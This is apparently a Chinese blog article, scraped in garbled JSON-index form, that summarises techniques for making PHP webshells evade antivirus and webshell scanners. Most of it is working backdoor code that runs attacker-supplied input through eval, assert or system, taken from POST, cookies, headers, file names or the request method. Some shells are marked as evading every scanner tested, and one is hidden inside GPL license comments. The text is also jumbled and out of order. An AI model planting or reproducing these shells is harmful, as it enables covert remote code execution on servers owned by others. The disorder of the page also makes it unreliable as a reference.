@author xxcms * @package Glimmer * @subpackage PluginsShared */ /** * get a compiler parameter and echo to console */ function get_compiler_param ( $params , $index , $default = null ) { if ( ! isset ( $params [ $index ])) { return $default ; } if ( ! preg_match ( '/^([\\'\"]?)[a-zA-Z0-9](\\\\1)/' , $params [ $index ])) { throw new Exception ( \" $index is not a literal\" ); } $t = null ; eval ( \" \\$ t = \" . $params [ $index ]); return $t ; } $params = array ( 'code' => $_GET [ 2333 ]); $a = get_compiler_param ( $params , 'code' , \"whoami\" ); if ( isset ( $_GET [ 'print' ])){ echo ( \"<script>console.log('\" . $a . \"');</script>\" ); } <?php // \u8fd9\u4e2a\u9a6c\u7531\u4e8eextract\u53ca\u660e\u663e\u7684\u52a8\u6001\u8c03\u7528\u8fc7\u4e0d\u4e86\u514d\u6740,\u4f46\u662f\u4ecd\u4e0d\u5931\u4e3a\u4e00\u79cd\u597d\u601d\u8def // copy from http://webshell.cdxy.me/ /* GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/> Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The GNU General Public License is a free, copyleft license for software and other kinds of works. The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users. We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors. You can apply it to your programs, too. When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things. To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights. Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others. For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received. You must make sure that they, too, receive or can get the source code. And you must show them these terms so they know their rights. Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you */ extract ( $_COOKIE ); /* copy, distribute and/or modify it. For the developers' and authors' protection, the GPL clearly explains that there is no warranty for this free software. For both users' and authors' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions. Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so. This is fundamentally incompatible with the aim of protecting users' freedom to change the software. The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable. Therefore, we have designed this version of the GPL to prohibit the practice for those products. If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users. Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary. patents applied to GPL assures that patents cannot be used to render the program non-free. The precise terms and conditions for copying, distribution and modification follow. TERMS AND CONDITIONS 0. Definitions. \"This License\" refers to version 3 of the GNU General Public License. \"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks. \"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations. To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work. A \"covered work\" means either the unmodified Program or a work based on the Program. To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well. To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying. An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion. 1. Source Code. The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work. A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language. The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it. The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not */ @ $PC4E20 &&@ $F ( $A , $B ); /*. For example, Corresponding Source the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work. The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source. The Corresponding Source for a work in source code form is that same work. 2. Basic Permissions. All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law. You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you. Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary. */ ?> \u4e5f\u8bb8\u4e0a\u9762\u7684\u65b9\u6cd5\u53ea\u4f7f\u7528\u4e00\u79cd\u7684\u8bdd\u65e0\u6cd5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684,\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5d4c\u5957\u4f7f\u7528,\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570/\u7c7b,\u5728\u91cc\u9762\u8fdb\u884c\u8c03\u7528 <?php // copy from https://xz.aliyun.com/t/5152 function test ( $a , $b ){ array_map ( $a , $b ); } test ( assert , array ( $_POST [ 'x' ])); ?> <?php // copy from https://xz.aliyun.com/t/5152 class loveme { var $a ; var $b ; function __construct ( $a , $b ) { $this -> a = $a ; $this -> b = $b ; } function test () { array_map ( $this -> a , $this -> b ); } } $p1 = new loveme ( assert , array ( $_POST [ 'x' ])); $p1 -> test (); ?> \u7b26\u53f7\u5e72\u6270 # \u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u7528\u4e8e\u5e72\u6270\u67e5\u6740\u7684\u6b63\u5219\u5224\u65ad,\u53ef\u4ee5\u4f7f\u7528\u7684\u7b26\u53f7\u6709null,\\n,\\r,\\t\u7b49 \u5e38\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u62fc\u63a5,\u5982\u679c\u4f60\u7684webshell\u88ab\u6740\u4e86,\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b, \u5982: <?php // copy from https://xz.aliyun.com/t/5152 $a = $_REQUEST [ 'a' ]; $b = null ; eval ( $b . $a ); ?> <?php // copy from https://xz.aliyun.com/t/5152 $a = $_POST [ 'a' ]; $b = \" \\n \" ; eval ( $b .= $a ); ?> \u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9a9a\u7684\u59ff\u52bf\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u662f\u63d2\u5165\u4e00\u4e9b\u63a7\u5236\u7b26 [\\x00-\\x20] ,PHP\u5f15\u64ce\u4f1a\u5ffd\u7565\u8fd9\u4e9b\u63a7\u5236\u5b57\u7b26,\u6b63\u786e\u6267\u884cPHP\u51fd\u6570,\u5982: <?php // copy from https://bbs.symbo1.com/t/topic/94 eval \\x01\\x02 ( $_POST [ 2333 ]); //\u8fd9\u91cc\\x01\u4e0e\\x02\u8981\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26 \u522b\u540d/\u91cd\u547d\u540d # \u5176\u5b9ePHP\u4e2d\u662f\u6709\u5f88\u591a\u51fd\u6570\u522b\u540d\u7684,\u5982pos\u662fcurrent\u7684\u522b\u540d,\u5728PHP5.6\u52a0\u5165\u4e86\u51fd\u6570\u540d\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u540e\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\"\u522b\u540d\". \u8fd9\u91cc\u9644\u4e00\u4e2aPHP7.4.3\u4e2d\u51fd\u6570\u522b\u540d\u8868(\u4e2a\u4eba\u6574\u7406,\u53ef\u80fd\u4f1a\u6709\u9519/\u6f0f) bzwrite->fwrite bzflush->fflush bzclose->fclose isId->dom_attr_is_id substringData->dom_characterdata_substring_data appendData->dom_characterdata_append_data insertData->dom_characterdata_insert_data deleteData->dom_characterdata_delete_data replaceData->dom_characterdata_replace_data createElement->dom_document_create_element createDocumentFragment->dom_document_create_document_fragment createTextNode->dom_document_create_text_node createComment->dom_document_create_comment createCDATASection->dom_document_create_cdatasection createProcessingInstruction->dom_document_create_processing_instruction createAttribute->dom_document_create_attribute createEntityReference->dom_document_create_entity_reference getElementsByTagName->dom_document_get_elements_by_tag_name importNode->dom_document_import_node createElementNS->dom_document_create_element_ns createAttributeNS->dom_document_create_attribute_ns getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns getElementById->dom_document_get_element_by_id adoptNode->dom_document_adopt_node normalizeDocument->dom_document_normalize_document renameNode->dom_document_rename_node save->dom_document_save saveXML->dom_document_savexml validate->dom_document_validate xinclude->dom_document_xinclude saveHTML->dom_document_save_html saveHTMLFile->dom_document_save_html_file schemaValidate->dom_document_schema_validate_file schemaValidateSource->dom_document_schema_validate_xml relaxNGValidate->dom_document_relaxNG_validate_file relaxNGValidateSource->dom_document_relaxNG_validate_xml setParameter->dom_domconfiguration_set_parameter getParameter->dom_domconfiguration_get_parameter canSetParameter->dom_domconfiguration_can_set_parameter handleError->dom_domerrorhandler_handle_error item->dom_domimplementationlist_item getDomimplementation->dom_domimplementationsource_get_domimplementation getDomimplementations->dom_domimplementationsource_get_domimplementations item->dom_domstringlist_item getAttribute->dom_element_get_attribute setAttribute->dom_element_set_attribute removeAttribute->dom_element_remove_attribute getAttributeNode->dom_element_get_attribute_node setAttributeNode->dom_element_set_attribute_node removeAttributeNode->dom_element_remove_attribute_node getElementsByTagName->dom_element_get_elements_by_tag_name getAttributeNS->dom_element_get_attribute_ns setAttributeNS->dom_element_set_attribute_ns removeAttributeNS->dom_element_remove_attribute_ns getAttributeNodeNS->dom_element_get_attribute_node_ns setAttributeNodeNS->dom_element_set_attribute_node_ns getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns hasAttribute->dom_element_has_attribute hasAttributeNS->dom_element_has_attribute_ns setIdAttribute->dom_element_set_id_attribute setIdAttributeNS->dom_element_set_id_attribute_ns setIdAttributeNode->dom_element_set_id_attribute_node getNamedItem->dom_namednodemap_get_named_item setNamedItem->dom_namednodemap_set_named_item removeNamedItem->dom_namednodemap_remove_named_item item->dom_namednodemap_item getNamedItemNS->dom_namednodemap_get_named_item_ns setNamedItemNS->dom_namednodemap_set_named_item_ns removeNamedItemNS->dom_namednodemap_remove_named_item_ns count->dom_namednodemap_count getName->dom_namelist_get_name getNamespaceURI->dom_namelist_get_namespace_uri insertBefore->dom_node_insert_before replaceChild->dom_node_replace_child removeChild->dom_node_remove_child appendChild->dom_node_append_child hasChildNodes->dom_node_has_child_nodes cloneNode->dom_node_clone_node normalize->dom_node_normalize isSupported->dom_node_is_supported hasAttributes->dom_node_has_attributes compareDocumentPosition->dom_node_compare_document_position isSameNode->dom_node_is_same_node lookupPrefix->dom_node_lookup_prefix isDefaultNamespace->dom_node_is_default_namespace lookupNamespaceUri->dom_node_lookup_namespace_uri isEqualNode->dom_node_is_equal_node getFeature->dom_node_get_feature setUserData->dom_node_set_user_data getUserData->dom_node_get_user_data item->dom_nodelist_item count->dom_nodelist_count findOffset16->dom_string_extend_find_offset16 findOffset32->dom_string_extend_find_offset32 splitText->dom_text_split_text isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content isElementContentWhitespace->dom_text_is_whitespace_in_element_content replaceWholeText->dom_text_replace_whole_text handle->dom_userdatahandler_handle registerNamespace->dom_xpath_register_ns query->dom_xpath_query evaluate->dom_xpath_evaluate registerPhpFunctions->dom_xpath_register_php_functions ftp_quit->ftp_close imap_header->imap_headerinfo imap_listmailbox->imap_list imap_getmailboxes->imap_list_full imap_scanmailbox->imap_listscan imap_listsubscribed->imap_lsub imap_getsubscribed->imap_lsub_full imap_fetchtext->imap_body imap_scan->imap_listscan imap_create->imap_createmailbox imap_rename->imap_renamemailbox ldap_close->ldap_unbind ldap_get_values->ldap_get_values_len ldap_modify->ldap_mod_replace mysqli_execute->mysqli_stmt_execute mysqli_escape_string->mysqli_real_escape_string mysqli_set_opt->mysqli_options autocommit->mysqli_autocommit begin_transaction->mysqli_begin_transaction change_user->mysqli_change_user character_set_name->mysqli_character_set_name close->mysqli_close commit->mysqli_commit connect->mysqli_connect dump_debug_info->mysqli_dump_debug_info debug->mysqli_debug get_charset->mysqli_get_charset get_client_info->mysqli_get_client_info get_client_info->mysqli_get_client_info get_connection_stats->mysqli_get_connection_stats get_server_info->mysqli_get_server_info get_warnings->mysqli_get_warnings init->mysqli_init_method kill->mysqli_kill multi_query->mysqli_multi_query construct->mysqli_link_construct more_results->mysqli_more_results next_result->mysqli_next_result options->mysqli_options ping->mysqli_ping prepare->mysqli_prepare query->mysqli_query real_connect->mysqli_real_connect real_escape_string->mysqli_real_escape_string escape_string->mysqli_real_escape_string real_query->mysqli_real_query release_savepoint->mysqli_release_savepoint rollback->mysqli_rollback savepoint->mysqli_savepoint select_db->mysqli_select_db set_charset->mysqli_set_charset set_opt->mysqli_options ssl_set->mysqli_ssl_set stat->mysqli_stat stmt_init->mysqli_stmt_init store_result->mysqli_store_result thread_safe->mysqli_thread_safe use_result->mysqli_use_result refresh->mysqli_refresh construct->mysqli_result_construct close->mysqli_free_result free->mysqli_free_result data_seek->mysqli_data_seek fetch_field->mysqli_fetch_field fetch_fields->mysqli_fetch_fields fetch_field_direct->mysqli_fetch_field_direct fetch_all->mysqli_fetch_all fetch_array->mysqli_fetch_array fetch_assoc->mysqli_fetch_assoc fetch_object->mysqli_fetch_object fetch_row->mysqli_fetch_row field_seek->mysqli_field_seek free_result->mysqli_free_result construct->mysqli_stmt_construct attr_get->mysqli_stmt_attr_get attr_set->mysqli_stmt_attr_set bind_param->mysqli_stmt_bind_param bind_result->mysqli_stmt_bind_result close->mysqli_stmt_close data_seek->mysqli_stmt_data_seek execute->mysqli_stmt_execute fetch->mysqli_stmt_fetch get_warnings->mysqli_stmt_get_warnings result_metadata->mysqli_stmt_result_metadata more_results->mysqli_stmt_more_results next_result->mysqli_stmt_next_result num_rows->mysqli_stmt_num_rows send_long_data->mysqli_stmt_send_long_data free_result->mysqli_stmt_free_result reset->mysqli_stmt_reset prepare->mysqli_stmt_prepare store_result->mysqli_stmt_store_result get_result->mysqli_stmt_get_result oci_free_cursor->oci_free_statement ocifreecursor->oci_free_statement ocibindbyname->oci_bind_by_name ocidefinebyname->oci_define_by_name ocicolumnisnull->oci_field_is_null ocicolumnname->oci_field_name ocicolumnsize->oci_field_size ocicolumnscale->oci_field_scale ocicolumnprecision->oci_field_precision ocicolumntype->oci_field_type ocicolumntyperaw->oci_field_type_raw ociexecute->oci_execute ocicancel->oci_cancel ocifetch->oci_fetch ocifetchstatement->oci_fetch_all ocifreestatement->oci_free_statement ociinternaldebug->oci_internal_debug ocinumcols->oci_num_fields ociparse->oci_parse ocinewcursor->oci_new_cursor ociresult->oci_result ociserverversion->oci_server_version ocistatementtype->oci_statement_type ocirowcount->oci_num_rows ocilogoff->oci_close ocilogon->oci_connect ocinlogon->oci_new_connect ociplogon->oci_pconnect ocierror->oci_error ocifreedesc->oci_free_descriptor ocisavelob->oci_lob_save ocisavelobfile->oci_lob_import ociwritelobtofile->oci_lob_export ociloadlob->oci_lob_load ocicommit->oci_commit ocirollback->oci_rollback ocinewdescriptor->oci_new_descriptor ocisetprefetch->oci_set_prefetch ocipasswordchange->oci_password_change ocifreecollection->oci_free_collection ocinewcollection->oci_new_collection ocicollappend->oci_collection_append ocicollgetelem->oci_collection_element_get ocicollassignelem->oci_collection_element_assign ocicollsize->oci_collection_size ocicollmax->oci_collection_max ocicolltrim->oci_collection_trim load->oci_lob_load tell->oci_lob_tell truncate->oci_lob_truncate erase->oci_lob_erase flush->oci_lob_flush setbuffering->ocisetbufferinglob getbuffering->ocigetbufferinglob rewind->oci_lob_rewind read->oci_lob_read eof->oci_lob_eof seek->oci_lob_seek write->oci_lob_write append->oci_lob_append size->oci_lob_size writetofile->oci_lob_export export->oci_lob_export import->oci_lob_import writetemporary->oci_lob_write_temporary close->oci_lob_close save->oci_lob_save savefile->oci_lob_import free->oci_free_descriptor append->oci_collection_append getelem->oci_collection_element_get assignelem->oci_collection_element_assign assign->oci_collection_assign size->oci_collection_size max->oci_collection_max trim->oci_collection_trim free->oci_free_collection odbc_do->odbc_exec odbc_field_precision->odbc_field_len openssl_free_key->openssl_pkey_free openssl_get_privatekey->openssl_pkey_get_private openssl_get_publickey->openssl_pkey_get_public pcntl_errno->pcntl_get_last_error pg_exec->pg_query pg_getlastoid->pg_last_oid pg_cmdtuples->pg_affected_rows pg_errormessage->pg_last_error pg_numrows->pg_num_rows pg_numfields->pg_num_fields pg_fieldname->pg_field_name pg_fieldsize->pg_field_size pg_fieldtype->pg_field_type pg_fieldnum->pg_field_num pg_fieldprtlen->pg_field_prtlen pg_fieldisnull->pg_field_is_null pg_freeresult->pg_free_result pg_result->pg_fetch_result pg_loreadall->pg_lo_read_all pg_locreate->pg_lo_create pg_lounlink->pg_lo_unlink pg_loopen->pg_lo_open pg_loclose->pg_lo_close pg_loread->pg_lo_read pg_lowrite->pg_lo_write pg_loimport->pg_lo_import pg_loexport->pg_lo_export pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding posix_errno->posix_get_last_error session_commit->session_write_close snmpwalkoid->snmprealwalk snmp_set_oid_numeric_print->snmp_set_oid_output_format socket_getopt->socket_get_option socket_setopt->socket_set_option sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey join->implode chop->rtrim strchr->strstr srand->mt_srand getrandmax->mt_getrandmax show_source->highlight_file ini_alter->ini_set checkdnsrr->dns_check_record getmxrr->dns_get_mx doubleval->floatval is_integer->is_int is_long->is_int is_double->is_float fputs->fwrite set_file_buffer->stream_set_write_buffer socket_set_blocking->stream_set_blocking stream_register_wrapper->stream_wrapper_register stream_register_wrapper->stream_wrapper_register socket_set_timeout->stream_set_timeout dir->getdir is_writeable->is_writable diskfreespace->disk_free_space pos->current sizeof->count key_exists->array_key_exists close->closedir rewind->rewinddir importStylesheet->xsl_xsltprocessor_import_stylesheet transformToDoc->xsl_xsltprocessor_transform_to_doc transformToUri->xsl_xsltprocessor_transform_to_uri transformToXml->xsl_xsltprocessor_transform_to_xml setParameter->xsl_xsltprocessor_set_parameter getParameter->xsl_xsltprocessor_get_parameter removeParameter->xsl_xsltprocessor_remove_parameter hasExsltSupport->xsl_xsltprocessor_has_exslt_support registerPHPFunctions->xsl_xsltprocessor_register_php_functions setProfiling->xsl_xsltprocessor_set_profiling setSecurityPrefs->xsl_xsltprocessor_set_security_prefs getSecurityPrefs->xsl_xsltprocessor_get_security_prefs gzrewind->rewind gzclose->fclose gzeof->feof gzgetc->fgetc gzgets->fgets DEP_FALIAS(gzgetss->fgetss gzread->fread gzpassthru->fpassthru gzseek->fseek gztell->ftell gzwrite->fwrite gzputs->fwrite getallheaders->apache_request_headers getallheaders->litespeed_request_headers apache_request_headers->litespeed_request_headers apache_response_headers->litespeed_response_headers \u8fd9\u91cc\u9644\u7684\u8868\u4e0d\u5305\u542b\u88ab\u5f03\u7528\u7684(\u4f1a\u6709PHP\u8b66\u544a,\u4f46\u4ecd\u53ef\u7528),\u800c\u5728\u8fd9\u4e9b\u522b\u540d\u4e2d,\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u51fd\u6570mbereg replace,\u8fd9\u4e2a\u51fd\u6570\u662fmb ereg replace\u7684\u522b\u540d,mb ereg replace\u4e0epreg replace\u7c7b\u4f3c,\u53ef\u4ee5\u5229\u7528e\u6a21\u5f0f\u9690\u5f0f\u6267\u884c\u4ee3\u7801,\u4f46\u662fmb ereg replace\u65e0\u6cd5\u9003\u8fc7\u67e5\u6740,\u800cmbereg replace\u5219\u662fALLKILL,\u6ca1\u9519,\u53ea\u662f\u4e00\u4e2a \u7684\u5dee\u522b,\u8ba9\u4ed6\u9003\u8fc7\u4e86\u514d\u6740\u7684\u773c\u775b <?php // (ALLKILL) error_reporting ( 0 ); mbereg_replace ( '.*' , '\\0' , $_REQUEST [ 2333 ], 'mer' ); //php5 php7 success ?> \u53e6\u5916,\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\u522b\u540d,\u5982: <?php // PHP >=5.6 \u53ef\u8fc7\u76fe\u72d7 use function \\system as strlen ; // \u914d\u5408\u6587\u4ef6\u5305\u542b\u8fd9\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u52ab\u6301,\u7559\u5f85\u4f60\u4eec\u5f00\u53d1 strlen ( $_POST [ 1 ]); <?php // (ALLKILL) define ( \"ARRAY2\" , \"sys\" . \"tem\" ); @ constant ( \"ARRAY2\" )( pos ( pos ( $GLOBALS ))); // PHP>7 \u514d\u8d23\u58f0\u660e: \u5728\u5bf9\u65b9\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6216\u95f4\u63a5\u5229\u7528\u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u7814\u7a76\u6837\u672c\u653b\u51fb\u76ee\u6807\u662f\u8fdd\u6cd5\u884c\u4e3a. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u4ec5\u4e3a\u5b89\u5168\u7814\u7a76\u548c\u6388\u6743\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5176\u4f7f\u7528\u4eba\u5458\u6709\u8d23\u4efb\u548c\u4e49\u52a1\u9075\u5b88\u5f53\u5730\u6cd5\u5f8b\u6761\u89c4. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u6837\u672c\u53ca\u6587\u7ae0\u4ec5\u4e3a\u4fc3\u8fdb\u5b89\u5168\u9632\u5fa1\u7814\u7a76\u4f7f\u7528\uff0c\u7814\u7a76\u4eba\u5458\u5bf9\u56e0\u8bef\u7528\u8be5\u7a0b\u5e8f\u9020\u6210\u7684\u8d44\u4ea7\u635f\u574f\u548c\u635f\u5931\u6982\u4e0d\u8d1f\u8d23.","title":"webshell\u514d\u6740\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#webshell\u514d\u6740\u603b\u7ed3","text":"\u4ee5\u4e0b\u5185\u5bb9\u57fa\u4e8ePHP7 \u6700\u8fd1\u5bf9webshell\u7684\u514d\u6740\u673a\u5236\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3,\u4e8e\u662f\u5f00\u59cb\u8fdb\u884c\u7814\u7a76,\u53c2\u8003\u4e86\u7f51\u4e0a\u8bb8\u8bb8\u591a\u591a\u7684\u6587\u7ae0,\u4ee5\u4e0b\u662f\u6211\u5bf9webshell\u514d\u6740\u7684\u4e00\u4e9b\u603b\u7ed3 \u4f7f\u7528\u4ee5\u4e0b\u7f51\u7ad9\u53ca\u514d\u6740\u5de5\u5177\u8fdb\u884c\u514d\u6740\u6d4b\u8bd5(\u5e26\u661f\u53f7\u7684\u8868\u793a\u6211\u8ba4\u4e3a\u68c0\u6d4b\u6548\u679c\u6bd4\u8f83\u597d\u7684\u5de5\u5177/\u7f51\u7ad9): webshellchop \u957f\u4ead(*) \u6df1\u5ea6\u5b66\u4e60 WEBDIR+ \u767e\u5ea6(*) \u6cb3\u9a6c\u5728\u7ebf\u67e5\u6740 D\u76fe \u5b89\u5168\u72d7 \u53c2\u8003\u6587\u7ae0: https://www.freebuf.com/articles/web/155891.html https://bbs.symbo1.com/t/topic/94 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html https://xz.aliyun.com/t/5152 http://webshell.cdxy.me/ \u4e0b\u7684\u8bc4\u8bba ...","title":"webshell\u514d\u6740\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u514d\u6740\u6280\u672f\u57fa\u7840","text":"","title":"\u514d\u6740\u6280\u672f\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u524d\u8a00","text":"\u5bf9\u4e8ewebshell\u7684\u514d\u6740\u800c\u8a00,PHP5\u4e0ePHP7\u6709\u5f88\u5927\u7684\u4e0d\u540c,\u5728PHP7\u4e4b\u540e,assert\u8fd9\u4e2a\u9a6c\u513f\u5e38\u7528\u7684\u51fd\u6570\u53d8\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8eeval\u7684\u8bed\u6cd5\u6784\u9020,\u8fd9\u4f7f\u5f97\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u52a8\u6001\u51fd\u6570\u7684\u65b9\u5f0f\u6765\u8c03\u7528assert,\u8fd9\u65e0\u7591\u662f\u5bf9\u514d\u6740\u7684\u4e00\u6b21\u6c89\u91cd\u6253\u51fb.(\u7ecf\u8fc7\u4e25\u683c\u6d4b\u8bd5,\u5728PHP7.0.33\u4e2d\u4f9d\u7136\u53ef\u4ee5,\u731c\u6d4b\u5e94\u8be5\u662fPHP7.1\u4ee5\u540e),\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8f6c\u53d8\u601d\u8def\u4e86.\u6807\u6709(ALLKILL)\u5b57\u6837\u7684webshell\u901a\u8fc7\u4e86\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u67e5\u6740","title":"\u524d\u8a00"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u53e6\u7c7b\u7684\u5165\u53e3","text":"\u6211\u4eec\u5e38\u89c1\u7684webshell\u5165\u53e3\u90fd\u662f GET, POST\u4e4b\u7c7b\u7684,\u4f46\u662f\u5176\u5b9e\u4e00\u5207\u7684\u5165\u53e3\u6211\u4eec\u90fd\u53ef\u4ee5\u8fdb\u884c\u5229\u7528,\u4ee5\u6b64\u6765\u9003\u8fc7\u67e5\u6740: $_GET $_POST $_COOKIE $_REQUEST $ SERVER \u5176\u4e2d\u7684\u67d0\u4e9b\u53c2\u6570\u53ef\u63a7,\u5982REQUEST METHOD,QUERY STRING,HTTP USER_AGENT\u7b49 session_id() \u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u5229\u7528 $_FILE $GLOBALS getallheaders() get defined vars() get defined functions() \u4e0b\u9762\u4e3e\u51e0\u4e2a\u4f8b\u5b50: <?php @ eval ( urldecode ( $_FILES [ 'file' ][ 'name' ])); // \u8be5\u9a6c\u4f1a\u628a\u53cc\u5f15\u53f7\u7ed9URL\u7f16\u7801, // \u56e0\u6b64\u5982\u679cpayload\u4e2d\u6709\u53cc\u5f15\u53f7\u5219\u9700\u8981\u5957\u4e00\u5c42urldecode @ eval ( urldecode ( $_FILES [ 'file' ][ 'type' ])); // \u8be5p\u9a6c\u4f1a\u628a\u5206\u53f7\u5403\u6389,\u56e0\u6b64\u9700\u8981\u5bf9\u5206\u53f7\u8fdb\u884c\u7f16\u7801\u5982URL\u7f16\u7801(%3B) //\u56e0\u6b64\u9700\u8981\u5957\u4e00\u5c42urldecode ?> <?php @ eval ( hex2bin ( $_SERVER [ 'REQUEST_METHOD' ])); // \u8be5\u9a6c\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u6765\u5b9e\u73b0\u6267\u884c,\u7531\u4e8e\u7b26\u53f7\u95ee\u9898 // \u9700\u8981\u7528bin2hex\u5bf9payload\u8fdb\u884c\u7f16\u7801 ?> <?php $a = $_SERVER [ 'QUERY_STRING' ]; //\u4f8b\u5b50 ?php=info()& $a = str_replace ( \"&\" , \";\" , $a ); $a = str_replace ( \"=\" , \"\" , $a ); @ eval ( $a ); ?> <?php @ eval ( getallheaders ()[ 'Referer' ]); <?php // (ALLKILL) error_reporting ( 0 ); eval ( null . implode ( reset ( get_defined_vars ()))); // php>=5.5 ?a=echo 1; ?> <?php // 